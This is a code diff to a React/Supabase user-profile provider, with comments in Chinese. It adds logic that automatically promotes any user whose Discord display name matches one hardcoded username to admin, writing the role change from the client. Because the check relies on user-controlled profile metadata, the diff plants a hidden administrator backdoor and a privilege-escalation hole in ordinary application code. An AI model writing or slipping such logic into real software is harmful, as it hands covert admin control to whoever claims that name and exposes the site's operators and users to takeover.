@@ -96,9 +96,28 @@ export const UserProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
       if (error) throw error;
 
+      // 檢查 Discord 用戶名是否為特殊管理員
+      const userData = await supabase.auth.getUser();
+      const discordUsername = userData.data.user?.user_metadata?.full_name || userData.data.user?.user_metadata?.name;
+      
+      let role = data.role as 'admin' | 'vip' | 'user';
+      if (discordUsername === 'etcsfxrf_20944' && role !== 'admin') {
+        // 自動升級為管理員
+        const { data: updatedData, error: updateError } = await supabase
+          .from('profiles')
+          .update({ role: 'admin' })
+          .eq('id', userId)
+          .select()
+          .single();
+        
+        if (!updateError) {
+          role = 'admin';
+        }
+      }
+
       const typedProfile = {
         ...data,
-        role: data.role as 'admin' | 'vip' | 'user'
+        role
       } as User;
 
       setProfile(typedProfile);
